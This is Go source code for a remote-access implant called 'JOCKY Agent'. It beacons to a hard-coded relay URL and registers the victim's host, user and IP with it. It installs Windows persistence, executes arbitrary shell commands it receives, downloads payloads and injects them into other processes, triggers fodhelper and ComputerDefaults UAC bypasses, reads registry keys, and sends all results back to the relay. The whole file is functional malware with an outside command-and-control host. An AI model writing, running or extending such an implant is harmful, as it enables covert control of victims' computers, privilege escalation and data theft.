package main

import (
	"bytes"
	"context"
	"crypto/sha256"
	"crypto/tls"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"

	"golang.org/x/sys/windows/registry"
)

const (
	LISTENER_URL  = "https://jockey-relay.dm2528v.workers.dev"
	C2_AUTH       = "supersecret123"
	POLL_WAIT_SEC = 0
	POLL_GAP      = 8 * time.Second
	POLL_TIMEOUT  = 15 * time.Second
	HTTP_TIMEOUT  = 20 * time.Second
	TASK_TIMEOUT  = 60 * time.Second
	CMD_TIMEOUT   = 30 * time.Second
	MAX_CMD_BYTES = 65536
)

var AgentID = deriveAgentID()

func deriveAgentID() string {
	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	if runtime.GOOS == "windows" {
		username = os.Getenv("USERNAME")
	}
	sum := sha256.Sum256([]byte(hostname + "|" + username))
	base := "agent-" + hex.EncodeToString(sum[:8])
	if runtime.GOOS == "windows" && IsElevated() {
		base += "-high"
	}
	return base
}

var httpClient = &http.Client{
	Timeout: HTTP_TIMEOUT,
	Transport: &http.Transport{
		TLSClientConfig: &tls.Config{ServerName: "jockey-relay.dm2528v.workers.dev"},
	},
}

func doJSON(method, path string, body []byte, timeout time.Duration) ([]byte, error) {
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	url := LISTENER_URL + path
	req, err := http.NewRequestWithContext(ctx, method, url, bytes.NewReader(body))
	if err != nil {
		return nil, err
	}
	req.Header.Set("X-C2-Auth", C2_AUTH)
	req.Header.Set("Content-Type", "application/json")

	client := httpClient
	if timeout != HTTP_TIMEOUT {
		client = &http.Client{Timeout: timeout, Transport: httpClient.Transport}
	}

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusCreated {
		return nil, fmt.Errorf("HTTP %d", resp.StatusCode)
	}
	return io.ReadAll(resp.Body)
}

type RegisterRequest struct {
	AgentID  string `json:"agent_id"`
	Hostname string `json:"hostname"`
	OS       string `json:"os"`
	IP       string `json:"ip"`
	Arch     string `json:"arch"`
}

type Deployment struct {
	DeployID   string `json:"deploy_id"`
	ScriptID   string `json:"script_id"`
	Code       string `json:"code"`
	HashBefore string `json:"hash_before"`
}

type PollResponse struct {
	Status     string      `json:"status"`
	Deployment *Deployment `json:"deployment"`
}

type SubmitRequest struct {
	AgentID  string                   `json:"agent_id"`
	ScriptID string                   `json:"script_id"`
	DataEnc  string                   `json:"data_enc"`
	Findings []map[string]interface{} `json:"findings"`
}

func main() {
	noPersist := false
	for _, a := range os.Args[1:] {
		if a == "--no-persist" {
			noPersist = true
		}
	}

	if !noPersist && runtime.GOOS == "windows" && !IsElevated() {
		if !IsPersistenceInstalled() {
			if err := InstallPersistence(); err != nil {
				fmt.Fprintf(os.Stderr, "[!] Persistence install failed: %v\n", err)
			} else {
				fmt.Println("[+] Persistence installed")
				if err := SpawnPersistedCopy(); err == nil {
					fmt.Println("[+] Relaunched from persisted path; parent exiting")
					os.Exit(0)
				}
			}
		}
	}

	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	if runtime.GOOS == "windows" {
		username = os.Getenv("USERNAME")
	}
	osStr := runtime.GOOS + " " + runtime.GOARCH

	fmt.Printf("[+] JOCKY Agent %s\n", AgentID)
	fmt.Printf("[+] Relay: %s\n", LISTENER_URL)
	fmt.Printf("[+] Beacon: every %ds\n", int(POLL_GAP.Seconds()))

	InitializeEngine()

	for attempt := 1; attempt <= 10; attempt++ {
		if err := registerAgent(hostname, username, osStr); err == nil {
			break
		} else {
			fmt.Printf("[!] Register attempt %d: %v\n", attempt, err)
			time.Sleep(5 * time.Second)
		}
	}

	for {
		deploy, err := longPoll()
		if err != nil {
			fmt.Printf("[!] Poll: %v\n", err)
			time.Sleep(5 * time.Second)
			continue
		}
		if deploy != nil {
			go handleDeploy(deploy)
		}
		jitter := time.Duration(rand.Int63n(int64(POLL_GAP) / 2))
		time.Sleep(POLL_GAP + jitter)
	}
}

func handleDeploy(d *Deployment) {
	defer func() {
		if r := recover(); r != nil {
			fmt.Printf("[!] Panic in %s: %v\n", d.DeployID, r)
		}
	}()

	fmt.Printf("[TASK] deploy=%s script=%s\n", d.DeployID, d.ScriptID)
	fmt.Printf("[LOG]  %.80s\n", d.Code)

	ctx, cancel := context.WithTimeout(context.Background(), TASK_TIMEOUT)
	defer cancel()

	output := executeJOCKYContext(ctx, d.Code)
	fmt.Printf("[RESULT] %s\n", truncate(output, 200))

	for i := 0; i < 3; i++ {
		if err := submitResult(d.ScriptID, output); err == nil {
			break
		} else if i == 2 {
			fmt.Printf("[!] submit failed: %v\n", err)
		} else {
			time.Sleep(time.Duration(i+1) * 2 * time.Second)
		}
	}

	for i := 0; i < 3; i++ {
		if err := reportHash(d.ScriptID, sha256Hex([]byte(output))); err == nil {
			break
		} else if i == 2 {
			fmt.Printf("[!] hash failed: %v\n", err)
		} else {
			time.Sleep(time.Duration(i+1) * 2 * time.Second)
		}
	}
}

func executeJOCKYContext(ctx context.Context, script string) string {
	script = strings.TrimSpace(script)

	switch strings.ToLower(script) {
	case "__exit__", "exit", "kill", "__kill__":
		fmt.Println("[!] Kill switch. Removing persistence and exiting.")
		RemovePersistence()
		time.Sleep(500 * time.Millisecond)
		os.Exit(0)
	}

	if json.Valid([]byte(script)) {
		if doc, err := ParseIRDocumentJSON(script); err == nil {
			result, err := executeIRDocument(doc)
			if err != nil {
				return fmt.Sprintf("error: %v", err)
			}
			payload, marshalErr := json.MarshalIndent(result, "", "  ")
			if marshalErr != nil {
				return fmt.Sprintf("error: marshal result: %v", marshalErr)
			}
			return string(payload)
		}
	}

	if strings.HasPrefix(script, "inject ") {
		return executeInject(script)
	}

	if strings.HasPrefix(script, "privesc") {
		return executePrivesc(script)
	}

	if cmd := extractArg(script, "exec("); cmd != "" {
		return runShellCommandContext(ctx, cmd)
	}

	if path := extractArg(script, "collect_registry("); path != "" {
		path = strings.ReplaceAll(path, "\\\\", "\\")
		return collectRegistry(path)
	}

	return runShellCommandContext(ctx, script)
}

func executeInject(script string) string {
	parts := strings.SplitN(script, " ", 4)
	if len(parts) < 4 {
		return "error: invalid inject syntax"
	}
	method := parts[1]
	target := strings.Trim(parts[2], "\"")
	payloadRef := strings.Trim(parts[3], "\"")

	payload, err := downloadPayload(payloadRef)
	if err != nil {
		return fmt.Sprintf("error: payload download failed: %v", err)
	}

	var targetPID uint32 = 0
	var targetImg string = ""
	if pid, err := strconv.Atoi(target); err == nil {
		targetPID = uint32(pid)
	} else {
		targetImg = target
	}

	res := InjectPayload(method, targetPID, targetImg, payload, true, true)
	if res.Success {
		return "SUCCESS: " + res.Message
	}
	return fmt.Sprintf("FAILED: %s (Code %d)", res.Message, res.Code)
}

func executePrivesc(script string) string {
	fields := strings.Fields(script)
	method := "info"
	if len(fields) >= 2 {
		method = fields[1]
	}

	switch method {
	case "info":
		return PrivescInfo()
	case "uac-fodhelper":
		if err := UACBypassFodhelper(); err != nil {
			return fmt.Sprintf("error: %v", err)
		}
		return "SUCCESS: fodhelper UAC bypass triggered"
	case "uac-computerdefaults":
		if err := UACBypassComputerDefaults(); err != nil {
			return fmt.Sprintf("error: %v", err)
		}
		return "SUCCESS: ComputerDefaults UAC bypass triggered"
	default:
		return fmt.Sprintf("error: unknown privesc method %q", method)
	}
}

func extractArg(script, fn string) string {
	start := strings.Index(script, fn)
	if start < 0 {
		return ""
	}
	start += len(fn)
	if start >= len(script) {
		return ""
	}
	q := script[start]
	if q != '"' && q != '\'' {
		return ""
	}
	end := strings.Index(script[start+1:], string(q))
	if end < 0 {
		return ""
	}
	return script[start+1 : start+1+end]
}

func runShellCommandContext(ctx context.Context, cmdStr string) string {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.CommandContext(ctx, "cmd", "/c", cmdStr)
	} else {
		cmd = exec.CommandContext(ctx, "sh", "-c", cmdStr)
	}

	cmd.WaitDelay = 5 * time.Second

	out, err := cmd.CombinedOutput()
	if err != nil {
		if ctx.Err() == context.DeadlineExceeded {
			return fmt.Sprintf("error: command timed out after %ds", int(CMD_TIMEOUT.Seconds()))
		}
		return "error: " + err.Error() + "\noutput: " + string(out)
	}

	if len(out) > MAX_CMD_BYTES {
		out = out[:MAX_CMD_BYTES]
	}
	return string(out)
}

func collectRegistry(path string) string {
	if runtime.GOOS != "windows" {
		return "Registry access only supported on Windows"
	}
	parts := strings.SplitN(path, "\\", 2)
	if len(parts) != 2 {
		return "error: invalid registry path"
	}
	hiveStr, keyPath := parts[0], parts[1]

	var hive registry.Key
	switch strings.ToUpper(hiveStr) {
	case "HKLM":
		hive = registry.LOCAL_MACHINE
	case "HKCU":
		hive = registry.CURRENT_USER
	case "HKCR":
		hive = registry.CLASSES_ROOT
	case "HKU":
		hive = registry.USERS
	case "HKCC":
		hive = registry.CURRENT_CONFIG
	default:
		return "error: unknown hive " + hiveStr
	}

	key, err := registry.OpenKey(hive, keyPath, registry.READ)
	if err != nil {
		return "error: " + err.Error()
	}
	defer key.Close()

	names, err := key.ReadValueNames(0)
	if err != nil {
		return "error: " + err.Error()
	}
	var b strings.Builder
	for _, name := range names {
		v, _, err := key.GetStringValue(name)
		if err != nil {
			continue
		}
		fmt.Fprintf(&b, "%s: %s\n", name, v)
	}
	return b.String()
}

func downloadPayload(ref string) ([]byte, error) {
	url := ref
	if !strings.HasPrefix(url, "http://") && !strings.HasPrefix(url, "https://") {
		if !strings.HasPrefix(url, "/") {
			url = "/" + url
		}
		url = LISTENER_URL + url
	}

	ctx, cancel := context.WithTimeout(context.Background(), HTTP_TIMEOUT)
	defer cancel()

	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("X-C2-Auth", C2_AUTH)

	resp, err := httpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("HTTP %d fetching %s", resp.StatusCode, url)
	}
	return io.ReadAll(resp.Body)
}

func registerAgent(hostname, username, osStr string) error {
	req := RegisterRequest{
		AgentID:  AgentID,
		Hostname: hostname + "\\" + username,
		OS:       osStr,
		IP:       getLocalIP(),
		Arch:     runtime.GOARCH,
	}
	body, _ := json.Marshal(req)
	_, err := doJSON("POST", "/api/v1/agent/register", body, HTTP_TIMEOUT)
	if err == nil {
		fmt.Println("[+] Registered")
	}
	return err
}

func longPoll() (*Deployment, error) {
	req := map[string]interface{}{
		"agent_id": AgentID,
	}
	body, _ := json.Marshal(req)

	raw, err := doJSON("POST", "/api/v1/agent/poll", body, POLL_TIMEOUT)
	if err != nil {
		return nil, err
	}

	var resp PollResponse
	if err := json.Unmarshal(raw, &resp); err != nil {
		return nil, fmt.Errorf("decode: %w", err)
	}
	return resp.Deployment, nil
}

func submitResult(scriptID, output string) error {
	req := SubmitRequest{
		AgentID:  AgentID,
		ScriptID: scriptID,
		DataEnc:  output,
		Findings: []map[string]interface{}{},
	}
	body, _ := json.Marshal(req)
	_, err := doJSON("POST", "/api/v1/result/submit", body, HTTP_TIMEOUT)
	return err
}

func reportHash(scriptID, hashAfter string) error {
	req := map[string]string{
		"agent_id":   AgentID,
		"hash_after": hashAfter,
	}
	body, _ := json.Marshal(req)
	_, err := doJSON("POST", "/api/v1/script/"+scriptID+"/hash", body, HTTP_TIMEOUT)
	return err
}

func sha256Hex(data []byte) string {
	sum := sha256.Sum256(data)
	return hex.EncodeToString(sum[:])
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}

func getLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return "0.0.0.0"
	}
	for _, a := range addrs {
		if ipnet, ok := a.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return "0.0.0.0"
}